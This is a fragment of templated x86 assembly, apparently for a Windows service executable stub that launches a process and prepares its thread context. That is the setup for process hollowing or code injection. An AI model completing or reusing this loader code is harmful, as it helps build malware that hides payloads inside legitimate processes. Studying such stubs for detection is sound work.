...
servicehandler:
  push ebp
  mov ecx, [esp + 0x08]                                         ; ecx = dwControl (arg1)
  mov edi, [esp + 0x14]                                         ; edi = lpContext (arg4)
  mov ebp, [edi]                                                ; ebp = &blockApi
  lea eax, [edi + 0x08]                                         ; eax = &serviceStatus
...
get_servicehandler:
  ...
  {{ store_const('edx', SERVICE_RUNNING, offset=4 * 1) }}       ; ss.dwCurrentState = SERVICE_RUNNING
  {{ api_call('advapi32.dll', 'SetServiceStatus', arg1='ecx', arg2='edx') }}

  cmp ebx, 0                                                    ; CreateProcessA == 0
  je _servicemain_exit

  lea edx, [esp + {{ stkoff_ctx }}]                             ; edx = &Context
  {{ store_const('edx', CONTEXT_FULL, offset=(8 * 6)) }}        ; Context.ContextFlags = CONTEXT_FULL
  mov ecx, [esp + {{ stkoff_pi + 8 }}]                          ; ecx = pi.hThread
